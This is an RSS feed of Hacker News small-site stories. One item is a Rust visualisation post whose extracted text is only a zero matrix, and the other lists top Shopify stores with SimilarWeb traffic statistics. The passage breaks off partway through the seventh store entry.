<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Wed, 17 Feb 2021 01:06:08 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Wed, 17 Feb 2021 01:06:08 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Interactive Data Visualisation with Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26141018">thread link</a>) | @batterylow
<br/>
February 15, 2021 | https://shahinrostami.com/posts/programming/rust-notebooks/visualisation-of-co-occurring-types/ | <a href="https://web.archive.org/web/*/https://shahinrostami.com/posts/programming/rust-notebooks/visualisation-of-co-occurring-types/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<pre>[[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0]]</pre>
</div></div>]]>
            </description>
            <link>https://shahinrostami.com/posts/programming/rust-notebooks/visualisation-of-co-occurring-types/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26141018</guid>
            <pubDate>Mon, 15 Feb 2021 09:49:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Shopify's Top 90 Most Successful Startups in 2021]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26140934">thread link</a>) | @cedyf
<br/>
February 15, 2021 | https://reviewbolt.com/top/shopify/ | <a href="https://web.archive.org/web/*/https://reviewbolt.com/top/shopify/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><h2>Here's the list of the top 90 Shopify websites by traffic. All data is sourced from SimilarWeb's public data. I estimate revenue with [traffic * global ecom conversion rate * price of best selling product]. Facebook spend is estimated by [social traffic * 1.8 ]. SimilarWeb tells us how much traffic they receive from social channels and I multiply that by an average CPC of 1.8 as they tend to under-report this figure when I cross-reference it against large social media accounts that I manage. Keep scrolling to see more details for each company. Enjoy this list? Share this with 1 friend.</h2></p><div id="fashionnova.com"><h2>1<!-- -->. <!-- -->Fashionnova<!-- --> - <!-- -->22.49M<!-- --> </h2><div><div><div><div><p><img layout="responsive" alt="fashionnova.com screenshot" data-src="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dfashionnova.com%26t%3D1%26h%3Df6f43f7475663a2f2737f003dbfd012d8b590d7747ddd90f6e4e5e629f5475d6&amp;w=768&amp;q=75" data-srcset="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dfashionnova.com%26t%3D1%26h%3Df6f43f7475663a2f2737f003dbfd012d8b590d7747ddd90f6e4e5e629f5475d6&amp;w=320&amp;q=75 320w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dfashionnova.com%26t%3D1%26h%3Df6f43f7475663a2f2737f003dbfd012d8b590d7747ddd90f6e4e5e629f5475d6&amp;w=420&amp;q=75 420w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dfashionnova.com%26t%3D1%26h%3Df6f43f7475663a2f2737f003dbfd012d8b590d7747ddd90f6e4e5e629f5475d6&amp;w=768&amp;q=75 768w"></p></div></div></div></div><div><h3>Fashion nova is the top online fashion store for women. shop sexy club dresses, jeans, shoes, bodysuits, skirts and more. cheap &amp;amp; affordable fashion online.<!-- --> </h3><h3>Fashionnova gets 22M monthly visitors and grows primarily through Direct traffic from United States.</h3><p><h3>How fast is <!-- -->fashionnova.com<!-- --> growing?</h3><h3> <!-- -->fashionnova.com<!-- --> has grown by <!-- -->-10.0%<!-- --> in the last 6 months according to SimilarWeb. </h3></p><p><h3>How do people interact with <!-- -->fashionnova.com<!-- -->?</h3><h3>Last month, <!-- -->fashionnova.com<!-- --> received <!-- -->22M<!-- --> visitors who spent an average of <!-- -->7.9<!-- --> minutes on the website and visited <!-- -->6.0<!-- --> different pages per session. Overall, <!-- -->46<!-- -->% of people bounce on the first visit.</h3></p><p><h3>How do people find <!-- -->fashionnova.com<!-- -->? </h3><h3>10.2M<!-- --> people <!-- -->(45%)<!-- --> visit <!-- -->fashionnova.com<!-- --> directly. <!-- -->8.4M<!-- --> <!-- -->(37%)<!-- --> people search for them in Google. Whereas, <!-- -->1.5M<!-- --> <!-- -->(7%)<!-- --> discover <!-- -->fashionnova.com<!-- --> through Facebook, Reddit, and YouTube. <!-- -->1.9M<!-- --> <!-- -->(8%)<!-- --> visitors come from <!-- -->fashionnova.com<!-- -->'s email newsletters. Finally, <!-- -->418.9k<!-- --> <!-- -->(1.9%)<!-- --> people come from affiliates and or paid referrals. </h3></p><p><h3>Who uses <!-- -->fashionnova.com<!-- -->?</h3><h3>Fashionnova.com<!-- -->'s top market is the <!-- -->United States<!-- --> and they receive <!-- -->15.6M (69.6%)<!-- --> people. Then the 2nd is <!-- -->Canada<!-- --> with <!-- -->1.9M (8.3%)<!-- -->, the 3rd is <!-- -->United Kingdom<!-- --> with <!-- -->525.1k (2.3%)<!-- -->, the 4th is <!-- -->Australia<!-- --> with <!-- -->480.9k (2.1%)<!-- -->. Finally, the 5th is <!-- -->Jamaica<!-- --> with <!-- -->279.3k (1.2%)<!-- --> visitors.</h3></p><div><p><h3>Traffic Growth</h3><h3> <!-- -->-10.00%<!-- --> </h3></p><p><h3>Monthly Hits</h3><h3>22.49M</h3></p><p><h3>Time on Site</h3><h3>7.9<span>Mins</span></h3></p><p><h3>Pages per Visit</h3><h3>6.0</h3></p><p><h3>Bounce Rate</h3><h3>46<!-- -->%</h3></p></div><div><div><div><h2>Traffic Growth (last 6 months)</h2></div></div></div></div></div><div id="jbhifi.com.au"><h2>2<!-- -->. <!-- -->Jbhifi<!-- --> - <!-- -->15.23M<!-- --> </h2><div><div><div><div><p><img layout="responsive" alt="jbhifi.com.au screenshot" data-src="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Djbhifi.com.au%26t%3D1%26h%3Df7d5d51124abe27b728cfb83593c9991a70609037429c102666adc2821afdd94&amp;w=768&amp;q=75" data-srcset="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Djbhifi.com.au%26t%3D1%26h%3Df7d5d51124abe27b728cfb83593c9991a70609037429c102666adc2821afdd94&amp;w=320&amp;q=75 320w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Djbhifi.com.au%26t%3D1%26h%3Df7d5d51124abe27b728cfb83593c9991a70609037429c102666adc2821afdd94&amp;w=420&amp;q=75 420w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Djbhifi.com.au%26t%3D1%26h%3Df7d5d51124abe27b728cfb83593c9991a70609037429c102666adc2821afdd94&amp;w=768&amp;q=75 768w"></p></div></div></div></div><div><h3>Jb hi-fi is australia's largest home entertainment retailer with top products, great quality + value. learn more about our product range online.<!-- --> </h3><h3>Jbhifi gets 15M monthly visitors and grows primarily through Search traffic from Australia.</h3><p><h3>How fast is <!-- -->jbhifi.com.au<!-- --> growing?</h3><h3> <!-- -->jbhifi.com.au<!-- --> has grown by <!-- -->-0.9%<!-- --> in the last 6 months according to SimilarWeb. </h3></p><p><h3>How do people interact with <!-- -->jbhifi.com.au<!-- -->?</h3><h3>Last month, <!-- -->jbhifi.com.au<!-- --> received <!-- -->15M<!-- --> visitors who spent an average of <!-- -->3.5<!-- --> minutes on the website and visited <!-- -->5.0<!-- --> different pages per session. Overall, <!-- -->34<!-- -->% of people bounce on the first visit.</h3></p><p><h3>How do people find <!-- -->jbhifi.com.au<!-- -->? </h3><h3>5.3M<!-- --> people <!-- -->(35%)<!-- --> visit <!-- -->jbhifi.com.au<!-- --> directly. <!-- -->8.8M<!-- --> <!-- -->(58%)<!-- --> people search for them in Google. Whereas, <!-- -->243.1k<!-- --> <!-- -->(2%)<!-- --> discover <!-- -->jbhifi.com.au<!-- --> through Facebook, Reddit, and YouTube. <!-- -->271.4k<!-- --> <!-- -->(2%)<!-- --> visitors come from <!-- -->jbhifi.com.au<!-- -->'s email newsletters. Finally, <!-- -->17.3k<!-- --> <!-- -->(0.1%)<!-- --> people come from affiliates and or paid referrals. </h3></p><p><h3>Who uses <!-- -->jbhifi.com.au<!-- -->?</h3><h3>Jbhifi.com.au<!-- -->'s top market is the <!-- -->Australia<!-- --> and they receive <!-- -->14.8M (97.2%)<!-- --> people. Then the 2nd is <!-- -->United States<!-- --> with <!-- -->117.9k (0.8%)<!-- -->, the 3rd is <!-- -->New Zealand<!-- --> with <!-- -->49.2k (0.3%)<!-- -->, the 4th is <!-- -->United Kingdom<!-- --> with <!-- -->31.6k (0.2%)<!-- -->. Finally, the 5th is <!-- -->China<!-- --> with <!-- -->15.6k (0.1%)<!-- --> visitors.</h3></p><div><p><h3>Traffic Growth</h3><h3> <!-- -->-0.90%<!-- --> </h3></p><p><h3>Monthly Hits</h3><h3>15.23M</h3></p><p><h3>Time on Site</h3><h3>3.5<span>Mins</span></h3></p><p><h3>Pages per Visit</h3><h3>5.0</h3></p><p><h3>Bounce Rate</h3><h3>34<!-- -->%</h3></p></div><div><div><div><h2>Traffic Growth (last 6 months)</h2></div></div></div></div></div><div id="colourpop.com"><h2>3<!-- -->. <!-- -->Colourpop<!-- --> - <!-- -->11.08M<!-- --> </h2><div><div><div><div><p><img layout="responsive" alt="colourpop.com screenshot" data-src="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dcolourpop.com%26t%3D1%26h%3D001d20a66a62a586f5708a8e762711a9c141179770e474fb260a49f8e2efdf32&amp;w=768&amp;q=75" data-srcset="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dcolourpop.com%26t%3D1%26h%3D001d20a66a62a586f5708a8e762711a9c141179770e474fb260a49f8e2efdf32&amp;w=320&amp;q=75 320w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dcolourpop.com%26t%3D1%26h%3D001d20a66a62a586f5708a8e762711a9c141179770e474fb260a49f8e2efdf32&amp;w=420&amp;q=75 420w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dcolourpop.com%26t%3D1%26h%3D001d20a66a62a586f5708a8e762711a9c141179770e474fb260a49f8e2efdf32&amp;w=768&amp;q=75 768w"></p></div></div></div></div><div><h3>Redefining luxury beauty by creating high quality products at affordable prices. we pride ourselves on being cruelty-free, wallet-friendly, and keeping our customers at the center of our world. made in the usa, we imagine, innovate, test, and manufacture all under one roof.<!-- --> </h3><h3>Colourpop gets 11M monthly visitors and grows primarily through Direct traffic from United States.</h3><p><h3>How fast is <!-- -->colourpop.com<!-- --> growing?</h3><h3> <!-- -->colourpop.com<!-- --> has grown by <!-- -->21.5%<!-- --> in the last 6 months according to SimilarWeb. </h3></p><p><h3>How do people interact with <!-- -->colourpop.com<!-- -->?</h3><h3>Last month, <!-- -->colourpop.com<!-- --> received <!-- -->11M<!-- --> visitors who spent an average of <!-- -->5.6<!-- --> minutes on the website and visited <!-- -->4.0<!-- --> different pages per session. Overall, <!-- -->40<!-- -->% of people bounce on the first visit.</h3></p><p><h3>How do people find <!-- -->colourpop.com<!-- -->? </h3><h3>5.9M<!-- --> people <!-- -->(53%)<!-- --> visit <!-- -->colourpop.com<!-- --> directly. <!-- -->3.5M<!-- --> <!-- -->(31%)<!-- --> people search for them in Google. Whereas, <!-- -->696.6k<!-- --> <!-- -->(6%)<!-- --> discover <!-- -->colourpop.com<!-- --> through Facebook, Reddit, and YouTube. <!-- -->706.4k<!-- --> <!-- -->(6%)<!-- --> visitors come from <!-- -->colourpop.com<!-- -->'s email newsletters. Finally, <!-- -->134.7k<!-- --> <!-- -->(1.2%)<!-- --> people come from affiliates and or paid referrals. </h3></p><p><h3>Who uses <!-- -->colourpop.com<!-- -->?</h3><h3>Colourpop.com<!-- -->'s top market is the <!-- -->United States<!-- --> and they receive <!-- -->6.9M (62.0%)<!-- --> people. Then the 2nd is <!-- -->Canada<!-- --> with <!-- -->503.6k (4.5%)<!-- -->, the 3rd is <!-- -->Australia<!-- --> with <!-- -->412.8k (3.7%)<!-- -->, the 4th is <!-- -->United Kingdom<!-- --> with <!-- -->346.1k (3.1%)<!-- -->. Finally, the 5th is <!-- -->France<!-- --> with <!-- -->210k (1.9%)<!-- --> visitors.</h3></p><div><p><h3>Traffic Growth</h3><h3> <!-- -->21.50%<!-- --> </h3></p><p><h3>Monthly Hits</h3><h3>11.08M</h3></p><p><h3>Time on Site</h3><h3>5.6<span>Mins</span></h3></p><p><h3>Pages per Visit</h3><h3>4.0</h3></p><p><h3>Bounce Rate</h3><h3>40<!-- -->%</h3></p></div><div><div><div><h2>Traffic Growth (last 6 months)</h2></div></div></div></div></div><div id="gymshark.com"><h2>4<!-- -->. <!-- -->Gymshark<!-- --> - <!-- -->4.68M<!-- --> </h2><div><div><div><div><p><img layout="responsive" alt="gymshark.com screenshot" data-src="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dgymshark.com%26t%3D1%26h%3D7f7a6a9ec9d208acc9dd13cd4920a8631d7c3b599259acaabd3545b0a0917f45&amp;w=768&amp;q=75" data-srcset="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dgymshark.com%26t%3D1%26h%3D7f7a6a9ec9d208acc9dd13cd4920a8631d7c3b599259acaabd3545b0a0917f45&amp;w=320&amp;q=75 320w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dgymshark.com%26t%3D1%26h%3D7f7a6a9ec9d208acc9dd13cd4920a8631d7c3b599259acaabd3545b0a0917f45&amp;w=420&amp;q=75 420w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dgymshark.com%26t%3D1%26h%3D7f7a6a9ec9d208acc9dd13cd4920a8631d7c3b599259acaabd3545b0a0917f45&amp;w=768&amp;q=75 768w"></p></div></div></div></div><div><h3>Shop official gymshark exclusively online. enjoy lasting quality &amp; the perfect fit. free returns &amp; free shipping on workout clothes &amp; gym wear orders over $75.<!-- --> </h3><h3>Gymshark gets 5M monthly visitors and grows primarily through Search traffic from United States.</h3><p><h3>How fast is <!-- -->gymshark.com<!-- --> growing?</h3><h3> <!-- -->gymshark.com<!-- --> has grown by <!-- -->-8.8%<!-- --> in the last 6 months according to SimilarWeb. </h3></p><p><h3>How do people interact with <!-- -->gymshark.com<!-- -->?</h3><h3>Last month, <!-- -->gymshark.com<!-- --> received <!-- -->5M<!-- --> visitors who spent an average of <!-- -->4.7<!-- --> minutes on the website and visited <!-- -->7.0<!-- --> different pages per session. Overall, <!-- -->37<!-- -->% of people bounce on the first visit.</h3></p><p><h3>How do people find <!-- -->gymshark.com<!-- -->? </h3><h3>1.5M<!-- --> people <!-- -->(32%)<!-- --> visit <!-- -->gymshark.com<!-- --> directly. <!-- -->2.5M<!-- --> <!-- -->(53%)<!-- --> people search for them in Google. Whereas, <!-- -->208.7k<!-- --> <!-- -->(4%)<!-- --> discover <!-- -->gymshark.com<!-- --> through Facebook, Reddit, and YouTube. <!-- -->227.3k<!-- --> <!-- -->(5%)<!-- --> visitors come from <!-- -->gymshark.com<!-- -->'s email newsletters. Finally, <!-- -->223.2k<!-- --> <!-- -->(4.8%)<!-- --> people come from affiliates and or paid referrals. </h3></p><p><h3>Who uses <!-- -->gymshark.com<!-- -->?</h3><h3>Gymshark.com<!-- -->'s top market is the <!-- -->United States<!-- --> and they receive <!-- -->1.6M (34.9%)<!-- --> people. Then the 2nd is <!-- -->United Kingdom<!-- --> with <!-- -->879.8k (18.8%)<!-- -->, the 3rd is <!-- -->Canada<!-- --> with <!-- -->344.4k (7.4%)<!-- -->, the 4th is <!-- -->Australia<!-- --> with <!-- -->281.8k (6.0%)<!-- -->. Finally, the 5th is <!-- -->Netherlands<!-- --> with <!-- -->213.4k (4.6%)<!-- --> visitors.</h3></p><div><p><h3>Traffic Growth</h3><h3> <!-- -->-8.80%<!-- --> </h3></p><p><h3>Monthly Hits</h3><h3>4.68M</h3></p><p><h3>Time on Site</h3><h3>4.7<span>Mins</span></h3></p><p><h3>Pages per Visit</h3><h3>7.0</h3></p><p><h3>Bounce Rate</h3><h3>37<!-- -->%</h3></p></div><div><div><div><h2>Traffic Growth (last 6 months)</h2></div></div></div></div></div><div id="isawitfirst.com"><h2>5<!-- -->. <!-- -->Isawitfirst<!-- --> - <!-- -->4.13M<!-- --> </h2><div><div><div><div><p><img layout="responsive" alt="isawitfirst.com screenshot" data-src="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Disawitfirst.com%26t%3D1%26h%3Dea38e7470f7f7094778855e46e539de594237a32f75a40229a0916883b283973&amp;w=768&amp;q=75" data-srcset="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Disawitfirst.com%26t%3D1%26h%3Dea38e7470f7f7094778855e46e539de594237a32f75a40229a0916883b283973&amp;w=320&amp;q=75 320w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Disawitfirst.com%26t%3D1%26h%3Dea38e7470f7f7094778855e46e539de594237a32f75a40229a0916883b283973&amp;w=420&amp;q=75 420w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Disawitfirst.com%26t%3D1%26h%3Dea38e7470f7f7094778855e46e539de594237a32f75a40229a0916883b283973&amp;w=768&amp;q=75 768w"></p></div></div></div></div><div><h3>Shop the latest women's fashion at i saw it first. 100s of new styles every week! clothes, dresses, shoes &amp; accessories. must have looks and trends from only ¬£5<!-- --> </h3><h3>Isawitfirst gets 4M monthly visitors and grows primarily through Search traffic from United Kingdom.</h3><p><h3>How fast is <!-- -->isawitfirst.com<!-- --> growing?</h3><h3> <!-- -->isawitfirst.com<!-- --> has grown by <!-- -->-9.8%<!-- --> in the last 6 months according to SimilarWeb. </h3></p><p><h3>How do people interact with <!-- -->isawitfirst.com<!-- -->?</h3><h3>Last month, <!-- -->isawitfirst.com<!-- --> received <!-- -->4M<!-- --> visitors who spent an average of <!-- -->7.2<!-- --> minutes on the website and visited <!-- -->5.0<!-- --> different pages per session. Overall, <!-- -->45<!-- -->% of people bounce on the first visit.</h3></p><p><h3>How do people find <!-- -->isawitfirst.com<!-- -->? </h3><h3>1.3M<!-- --> people <!-- -->(31%)<!-- --> visit <!-- -->isawitfirst.com<!-- --> directly. <!-- -->2.3M<!-- --> <!-- -->(55%)<!-- --> people search for them in Google. Whereas, <!-- -->127.6k<!-- --> <!-- -->(3%)<!-- --> discover <!-- -->isawitfirst.com<!-- --> through Facebook, Reddit, and YouTube. <!-- -->235.2k<!-- --> <!-- -->(6%)<!-- --> visitors come from <!-- -->isawitfirst.com<!-- -->'s email newsletters. Finally, <!-- -->85.7k<!-- --> <!-- -->(2.1%)<!-- --> people come from affiliates and or paid referrals. </h3></p><p><h3>Who uses <!-- -->isawitfirst.com<!-- -->?</h3><h3>Isawitfirst.com<!-- -->'s top market is the <!-- -->United Kingdom<!-- --> and they receive <!-- -->3.4M (82.5%)<!-- --> people. Then the 2nd is <!-- -->Ireland<!-- --> with <!-- -->232.1k (5.6%)<!-- -->, the 3rd is <!-- -->United States<!-- --> with <!-- -->171k (4.1%)<!-- -->, the 4th is <!-- -->Sweden<!-- --> with <!-- -->34k (0.8%)<!-- -->. Finally, the 5th is <!-- -->Australia<!-- --> with <!-- -->30.8k (0.7%)<!-- --> visitors.</h3></p><div><p><h3>Traffic Growth</h3><h3> <!-- -->-9.80%<!-- --> </h3></p><p><h3>Monthly Hits</h3><h3>4.13M</h3></p><p><h3>Time on Site</h3><h3>7.2<span>Mins</span></h3></p><p><h3>Pages per Visit</h3><h3>5.0</h3></p><p><h3>Bounce Rate</h3><h3>45<!-- -->%</h3></p></div><div><div><div><h2>Traffic Growth (last 6 months)</h2></div></div></div></div></div><div id="ruggable.com"><h2>6<!-- -->. <!-- -->Ruggable<!-- --> - <!-- -->3.2M<!-- --> </h2><div><div><div><div><p><img layout="responsive" alt="ruggable.com screenshot" data-src="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Druggable.com%26t%3D1%26h%3D6862c65c5107ddbf92bec9da3ebc230bde417736443c3e2e3d0fb8859e061124&amp;w=768&amp;q=75" data-srcset="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Druggable.com%26t%3D1%26h%3D6862c65c5107ddbf92bec9da3ebc230bde417736443c3e2e3d0fb8859e061124&amp;w=320&amp;q=75 320w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Druggable.com%26t%3D1%26h%3D6862c65c5107ddbf92bec9da3ebc230bde417736443c3e2e3d0fb8859e061124&amp;w=420&amp;q=75 420w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Druggable.com%26t%3D1%26h%3D6862c65c5107ddbf92bec9da3ebc230bde417736443c3e2e3d0fb8859e061124&amp;w=768&amp;q=75 768w"></p></div></div></div></div><div><h3>Shop area rugs, accent rugs and runner rugs at ruggable. washable, stain-resistant and waterproof, our rugs are perfect for homes with kids and pets. ships free!<!-- --> </h3><h3>Ruggable gets 3M monthly visitors and grows primarily through Search traffic from United States.</h3><p><h3>How fast is <!-- -->ruggable.com<!-- --> growing?</h3><h3> <!-- -->ruggable.com<!-- --> has grown by <!-- -->52.4%<!-- --> in the last 6 months according to SimilarWeb. </h3></p><p><h3>How do people interact with <!-- -->ruggable.com<!-- -->?</h3><h3>Last month, <!-- -->ruggable.com<!-- --> received <!-- -->3M<!-- --> visitors who spent an average of <!-- -->3.9<!-- --> minutes on the website and visited <!-- -->5.0<!-- --> different pages per session. Overall, <!-- -->46<!-- -->% of people bounce on the first visit.</h3></p><p><h3>How do people find <!-- -->ruggable.com<!-- -->? </h3><h3>1.1M<!-- --> people <!-- -->(33%)<!-- --> visit <!-- -->ruggable.com<!-- --> directly. <!-- -->1.2M<!-- --> <!-- -->(37%)<!-- --> people search for them in Google. Whereas, <!-- -->639k<!-- --> <!-- -->(20%)<!-- --> discover <!-- -->ruggable.com<!-- --> through Facebook, Reddit, and YouTube. <!-- -->121.5k<!-- --> <!-- -->(4%)<!-- --> visitors come from <!-- -->ruggable.com<!-- -->'s email newsletters. Finally, <!-- -->141.4k<!-- --> <!-- -->(4.4%)<!-- --> people come from affiliates and or paid referrals. </h3></p><p><h3>Who uses <!-- -->ruggable.com<!-- -->?</h3><h3>Ruggable.com<!-- -->'s top market is the <!-- -->United States<!-- --> and they receive <!-- -->3M (93.9%)<!-- --> people. Then the 2nd is <!-- -->Canada<!-- --> with <!-- -->109.2k (3.4%)<!-- -->, the 3rd is <!-- -->United Kingdom<!-- --> with <!-- -->11.7k (0.4%)<!-- -->, the 4th is <!-- -->Germany<!-- --> with <!-- -->5.4k (0.2%)<!-- -->. Finally, the 5th is <!-- -->India<!-- --> with <!-- -->4.5k (0.1%)<!-- --> visitors.</h3></p><div><p><h3>Traffic Growth</h3><h3> <!-- -->52.40%<!-- --> </h3></p><p><h3>Monthly Hits</h3><h3>3.2M</h3></p><p><h3>Time on Site</h3><h3>3.9<span>Mins</span></h3></p><p><h3>Pages per Visit</h3><h3>5.0</h3></p><p><h3>Bounce Rate</h3><h3>46<!-- -->%</h3></p></div><div><div><div><h2>Traffic Growth (last 6 months)</h2></div></div></div></div></div><div id="morphe.com"><h2>7<!-- -->. <!-- -->Morphe<!-- --> - <!-- -->3.16M<!-- --> </h2><div><div><div><div><p><img layout="responsive" alt="morphe.com screenshot" data-src="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dmorphe.com%26t%3D1%26h%3D5d37734821403b1d5f02e1a8ec60cc9123259a9313150817cbebfdd0aac0b5ce&amp;w=768&amp;q=75" data-srcset="/_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dmorphe.com%26t%3D1%26h%3D5d37734821403b1d5f02e1a8ec60cc9123259a9313150817cbebfdd0aac0b5ce&amp;w=320&amp;q=75 320w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dmorphe.com%26t%3D1%26h%3D5d37734821403b1d5f02e1a8ec60cc9123259a9313150817cbebfdd0aac0b5ce&amp;w=420&amp;q=75 420w, /_next/image?url=https%3A%2F%2Fsite-images.similarcdn.com%2Fimage%3Furl%3Dmorphe.com%26t%3D1%26h%3D5d37734821403b1d5f02e1a8ec60cc9123259a9313150817cbebfdd0aac0b5ce&amp;w=768&amp;q=75 768w"></p></div></div></div></div><div><h3>Shop morphe.com to blend the rules. eyeshadow palettes, makeup brushes and lip colors from james charles, jaclyn hill, and others. a beauty brand created for the creators.<!-- --> </h3><h3>Morphe gets 3M monthly visitors and grows primarily through Search traffic from United States.</h3><p><h3>How fast is <!-- -->morphe.com<!-- --> growing?</h3><h3> <!-- -->morphe.com<!-- --> has grown by <!-- -->-36.8%<!-- --> in the last 6 months according to SimilarWeb. </h3></p><p><h3>How do people interact with <!-- -->morphe.com<!-- -->?</h3><h3>Last month, <!-- -->morphe.com<!-- --> received <!-- -->3M<!-- --> visitors who spent an average of <!-- -->3.0<!-- --> minutes on the website and visited <!-- -->4.0<!-- --> different pages per session. Overall, <!-- -->48<!-- -->% of people bounce on the first visit.</h3></p><p><h3>How do people find <!-- -->morphe.com<!-- -->? </h3><h3>1.1M<!-- --> people <!-- -->(36%)<!-- --> visit <!-- -->morphe.com<!-- --> directly. <!-- -->1.7M<!-- --> <!-- -->(53%)<!-- --> people search for them in Google. Whereas, <!-- -->141.4k<!-- --> <!-- 